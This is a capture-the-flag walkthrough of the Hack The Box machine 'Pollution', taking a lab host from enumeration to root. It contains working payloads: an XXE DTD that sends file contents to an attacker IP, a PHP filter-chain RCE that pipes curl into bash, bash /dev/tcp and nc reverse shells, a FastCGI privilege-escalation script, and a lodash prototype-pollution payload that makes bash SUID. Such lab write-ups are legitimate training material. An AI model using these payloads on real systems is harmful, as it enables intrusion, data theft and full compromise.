---
title: Pollution 
date: 2022-12-12 12:00:00
categories: [HTB,CTF]
tags: [htb]
---

# Enumeration

## Rustscan

```bash
mkdir rust; sudo rustscan -t 1500 -b 1500 --ulimit 65000 -a 10.10.11.192 -- -sV -sC -oA ./rust/{{ip}}
```

```bash
# Ports
Open 10.10.11.192:22
Open 10.10.11.192:80
Open 10.10.11.192:6379

# Services
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
80/tcp   open  http    syn-ack ttl 63 Apache httpd 2.4.54 ((Debian))
|_http-server-header: Apache/2.4.54 (Debian)
|_http-title: Home
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
6379/tcp open  redis   syn-ack ttl 63 Redis key-value store
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Port 80

Checking the website will reveal the real hostname **collect.htb**  
We'll add it to /etc/hosts for further enumeration

## Port 6379

Nothing interesting because we aren't authenticated

```bash
redis-cli -h collect.htb
collect.htb:6379> info
NOAUTH Authentication required.
(1.62s)
```

## Subdomains

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/shubs-subdomains.txt -u http://collect.htb -H "Host: FUZZ.collect.htb" -o subs.json  -fw 11803 -mc all
```

```bash
forum                   [Status: 200, Size: 14101, Words: 910, Lines: 337, Duration: 184ms]
developers              [Status: 401, Size: 469, Words: 42, Lines: 15, Duration: 54ms]
```

## Dirsearch

Just collect.htb delivered some interesting results for example **/api**

### collect.htb

```bash
dirsearch -u http://collect.htb/
```

```bash                                           
[20:25:10] 302 -    0B  - /admin  ->  /home                                 
[20:25:28] 302 -    0B  - /api  ->  /home                                   
[20:25:30] 301 -  311B  - /assets  ->  http://collect.htb/assets/           
[20:25:30] 200 -    1KB - /assets/
[20:26:03] 302 -    0B  - /home  ->  /login                                 
[20:26:15] 200 -    5KB - /login                                            
[20:26:45] 200 -    5KB - /register                                         
[20:26:52] 403 -  276B  - /server-status/                                   
```

## developers.collect.htb

Basic Auth Pop Up, we have no credentials at the moment

## forum.collect.htb

Seems to be a a forum for members of collect.htb where they are able to ask questions and get help  
[Collect-Forum](http://forum.collect.htb/forumdisplay.php?fid=2)

First let's register an account at [Register](http://forum.collect.htb/member.php?action=register)  

We are also able to get some infos about the environment when we study the threads posted.

- Victor(a Dev) has trouble accessing the pollution api. Attachment contains environment infos [T-13](http://forum.collect.htb/showthread.php?tid=13)
-  Kubernetes? [T-9](http://forum.collect.htb/showthread.php?tid=9)
-  John responsible for developers.collect.htb? [T-2](http://forum.collect.htb/showthread.php?tid=2)

## API Token

Once we downloaded the attachment of [http://forum.collect.htb/showthread.php?tid=13](http://forum.collect.htb/showthread.php?tid=13) we discovered it's a burp history file.  

Lets decode it an view it in our browser

```bash
git clone https://github.com/mrts/burp-suite-http-proxy-history-converter.git
cd burp-suite-http-proxy-history-converter
pip install --requirement=requirements.txt
# Will create a proxy_history.xml.html file 
python convert-burp-suite-http-proxy-history-to-csv.py ../proxy_history.xml
```

Checking the formatted logs we will discover a request that can be used to gain admin access 

```http
POST /set/role/admin HTTP/1.1
Host: collect.htb
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=r8qne20hig1k3li6prgk91t33j
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 38

token=ddac62a28254561001277727cb397baf
```

# Exploitation

## API XXE

Register an account on [collect.htb](http://collect.htb/register) and capture the requests in burp  
Use the previously discovered token to elevate our privileges  

```http
POST /set/role/admin HTTP/1.1
Host: collect.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 38
Origin: http://collect.htb
Connection: close
Referer: http://collect.htb/login
Cookie: PHPSESSID=b8gl9c885k7c52t61afnen4nj8
Upgrade-Insecure-Requests: 1

token=ddac62a28254561001277727cb397baf
```

Open [Collect - Admin](http://collect.htb/admin) in your browser, register a new API User and capture the request  

```http
POST /api HTTP/1.1
Host: collect.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-type: application/x-www-form-urlencoded
Content-Length: 171
Origin: http://collect.htb
Connection: close
Referer: http://collect.htb/admin
Cookie: PHPSESSID=b8gl9c885k7c52t61afnen4nj8

manage_api=<?xml version="1.0" encoding="UTF-8"?><root><method>POST</method><uri>/auth/register</uri><user><username>mrk1</username><password>mrk1</password></user></root>
```

After some try and error we are able to read files . Check bootstrap.php to receive the redis password!  

**xxe.dtd**  
Do it for **index.php** to get an overview and than check **bootstrap.php** which is mentioned in **index.php**  
While poking around we also discovered **/var/www/developers/.htpasswd**  

```http
<!ENTITY % file SYSTEM 'php://filter/convert.base64-encode/resource=../bootstrap.php'>
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://10.10.16.28/?file=%file;'>">
%eval;
%exfiltrate;
```

**Burp Request**  

```http
POST /api HTTP/1.1
Host: collect.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-type: application/x-www-form-urlencoded
Content-Length: 249
Origin: http://collect.htb
Connection: close
Referer: http://collect.htb/admin
Cookie: PHPSESSID=b8gl9c885k7c52t61afnen4nj8
token: ddac62a28254561001277727cb397baf

manage_api=<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://10.10.16.28/xxe.dtd"> %xxe;]><root><method>POST</method><uri>/auth/register</uri><user><username>mrk1</username><password>mrk</password></user></root>
```

**bootstrap.php**  

```php
<?php
ini_set('session.save_handler','redis');
ini_set('session.save_path','tcp://127.0.0.1:6379/?auth=COLLECTR3D1SPASS');

session_start();

require '../vendor/autoload.php';
```

**htpasswd**  
```text
# developers_group:r0cket
developers_group:$apr1$MzKA5yXY$DwEz.jxW9USWo8.goD7jY1
```

## developers.collect.htb 1

We'll use the basic auth creds to get a view of developers.collect.htb but there's nothing except a new login panel

## Redis

We are now also able to access redis

```bash
redis-cli -h collect.htb                                                                                                                        
collect.htb:6379> AUTH COLLECTR3D1SPASS
OK
collect.htb:6379> info
# Keyspace
db0:keys=2,expires=2,avg_ttl=1137183
collect.htb:6379> keys *
# Our new session on developers.collect.htb
1) "PHPREDIS_SESSION:q18lv56iqpr197npjbakrboird"
# Our session on collect.htb
3) "PHPREDIS_SESSION:b8gl9c885k7c52t61afnen4nj8"
collect.htb:6379> get PHPREDIS_SESSION:q18lv56iqpr197npjbakrboird
""
collect.htb:6379> get PHPREDIS_SESSION:b8gl9c885k7c52t61afnen4nj8
"username|s:4:\"mrk1\";role|s:5:\"admin\";"
# Let's try to bypass developers.collect.htb login page
# We'll use auth|s:1:\"a\";
collect.htb:6379> set PHPREDIS_SESSION:q18lv56iqpr197npjbakrboird "username|s:4:\"mrk1\";role|s:5:\"admin\";auth|s:1:\"a\";"
```

## developers.collect.htb 2

We have successfully bypassed the login page and can now see the developers section.  

The parameter **?page** is vulnerable to remote code execution using filter chains. We will use this project [Filter Chain Generator](https://github.com/synacktiv/php_filter_chain_generator) to get an reverse shell on the system :)

**Prepare Filterchain**  
```bash
# Prepare Filterchain
python3 php_filter_chain_generator.py --chain '<?= `curl -s -L 10.10.16.28/x|bash` ?>'
```

**x**  
```bash
# The shellscript to be executed on the remote system
bash -i >& /dev/tcp/10.10.16.28/4000 0>&1
```

**Shell**  
```bash
(remote) www-data@pollution:/dev/shm$ whoami
www-data
```

## Shell

Once we got our shell we can enumerate further

### php-fpm

Using netstat we can see a couple of open ports. Port 9000 catched my eye as this could be an fastcgi application.  

```bash
netstat -tlpn
```

```bash
tcp        0      0 127.0.0.1:9000          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:6379            0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -                   
tcp6       0      0 ::1:6379                :::*                    LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -  
```

```bash
ps aux | grep fpm
```

```bash
root         975  0.0  1.0 265400 40792 ?        Ss   Dec12   0:09 php-fpm: master process (/etc/php/8.1/fpm/php-fpm.conf)
victor      1115  0.0  0.5 265840 20640 ?        S    Dec12   0:00 php-fpm: pool victor
victor      1116  0.0  0.4 265840 19400 ?        S    Dec12   0:00 php-fpm: pool victor
```

## Privesc to Victor

We'll use [this](https://book.hacktricks.xyz/network-services-pentesting/9000-pentesting-fastcgi) script to escalate our privileges to user "victor" 

```bash
#!/bin/bash

PAYLOAD="<?php echo '<!--'; system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.16.28 4001 >/tmp/f'); echo '-->';"
FILENAMES="/dev/shm/index.php" # Exisiting file path

HOST=$1
B64=$(echo "$PAYLOAD"|base64)

for FN in $FILENAMES; do
    OUTPUT=$(mktemp)
    env -i \
      PHP_VALUE="allow_url_include=1"$'\n'"allow_url_fopen=1"$'\n'"auto_prepend_file='data://text/plain\;base64,$B64'" \
      SCRIPT_FILENAME=$FN SCRIPT_NAME=$FN REQUEST_METHOD=POST \
      cgi-fcgi -bind -connect $HOST:9000 &> $OUTPUT

    cat $OUTPUT
done
```

# Privesc Root

Once we have a shell as **victor** we start to enumerate the box again.

## Enumeration
Seems like we can access the pollution_api source code  

```bash
cd ~
ls /
Desktop  Documents  Downloads  Music  Pictures  Public  Templates  Videos  pollution_api  user.txt
cd pollution_api
ls
controllers  functions  index.js  log.sh  logs  models  node_modules  package-lock.json  package.json  routes
```

Check for any processes that are related to our api

```bash
ps aux | grep api
root        1347  0.0  1.9 1664540 76956 ?       Sl   Dec12   0:01 /usr/bin/node /root/pollution_api/index.js
```

**/home/victor/pollution_api/controllers/Messages_send.js**  
While parsing through the source code we can spot a possible **[prototype pollution](https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution/prototype-pollution-to-rce#exec-exploitation)** vulnerability  
But checking the code will tell us that we need admin permissions on the api.

```javascript
const Message = require('../models/Message');
const { decodejwt } = require('../functions/jwt');
const _ = require('lodash');
const { exec } = require('child_process');

const messages_send = async(req,res)=>{
    const token = decodejwt(req.headers['x-access-token'])
    if(req.body.text){

        const message = {
            user_sent: token.user,
            title: "Message for admins",
        };

        _.merge(message, req.body);

        exec('/home/victor/pollution_api/log.sh log_message');

        Message.create({
            text: JSON.stringify(message),
            user_sent: token.user
        });

        return res.json({Status: "Ok"});

    }

    return res.json({Status: "Error", Message: "Parameter text not found"});
}

module.exports = { messages_send };
```

## Getting API Admin Role

Using our discovered mysql credentials we are going to elevate the permissions of our api user that we created earlier

```bash
mysql -u webapp_user -p

MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| developers         |
| forum              |
| information_schema |
| mysql              |
| performance_schema |
| pollution_api      |
| webapp             |
+--------------------+

MariaDB [(none)]> use pollution_api;
Database changed

MariaDB [pollution_api]> show tables;
+-------------------------+
| Tables_in_pollution_api |
+-------------------------+
| messages                |
| users                   |
+-------------------------+

MariaDB [pollution_api]> select * from users
    -> ;
+----+----------+----------+------+---------------------+---------------------+
| id | username | password | role | createdAt           | updatedAt           |
+----+----------+----------+------+---------------------+---------------------+
|  1 | mrk1     | xxxx     | user | 2022-12-13 03:10:01 | 2022-12-13 03:10:01 |
|  2 | mrk2     | xxxx     | user | 2022-12-13 03:10:09 | 2022-12-13 03:10:09 |
|  3 | test     | xxxx     | user | 2022-12-13 03:28:25 | 2022-12-13 03:28:25 |
+----+----------+----------+------+---------------------+---------------------+

MariaDB [pollution_api]> update users set role='admin' where id=1;
Query OK, 1 row affected (0.002 sec)
Rows matched: 1  Changed: 1  Warnings: 0
```

## API Fun

### API Token
Login using our creds to get our api token

```bash
curl -X POST http://localhost:3000/auth/login -H 'Content-Type: application/json' -d '{"username":"mrk1", "password":"xxxx"}'
```

```json
{"Status":"Ok","Header":{"x-access-token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoibXJrMSIsImlzX2F1dGgiOnRydWUsInJvbGUiOiJhZG1pbiIsImlhdCI6MTY3MDkxMzMxMSwiZXhwIjoxNjcwOTE2OTExfQ.GYSuGRHHR9kGXFhLl8vXCIzuWvz0JK1PIkoOihFq2Eo"}}
```

### API Documentation

```bash
curl -X GET http://localhost:3000/documentation -H 'Content-Type: application/json' -H 'x-access-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoibXJrMSIsImlzX2F1dGgiOnRydWUsInJvbGUiOiJhZG1pbiIsImlhdCI6MTY3MDkxMzMxMSwiZXhwIjoxNjcwOTE2OTExfQ.GYSuGRHHR9kGXFhLl8vXCIzuWvz0JK1PIkoOihFq2Eo'
```

```json
{
  "Documentation": {
    "Routes": {
      "/admin/messages/send": {
        "Methods": "POST",
        "Params": {
          "text": "message text"
        }
      }
    }
  }
}
```

## RCE

We will `chmod +s /usr/bin/bash` so that we can get to root by using `/usr/bin/bash -p`

```bash
curl -X POST http://localhost:3000/admin/messages/send -H 'Content-Type: application/json' -H 'x-access-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoibXJrMSIsImlzX2F1dGgiOnRydWUsInJvbGUiOiJhZG1pbiIsImlhdCI6MTY3MDkxMzMxMSwiZXhwIjoxNjcwOTE2OTExfQ.GYSuGRHHR9kGXFhLl8vXCIzuWvz0JK1PIkoOihFq2Eo' -d '{"text":{"constructor":{"prototype":{"shell":"/proc/self/exe","argv0":"console.log(require(\"child_process\").execSync(\"chmod +s /usr/bin/bash\").toString())//","NODE_OPTIONS":"--require /proc/self/cmdline"}}}}'
```

```bash
ls -al /usr/bin/bash
-rwsr-sr-x 1 root root 1234376 Mar 27  2022 /usr/bin/bash
```

# Root

We're now root and get the last flag in /root 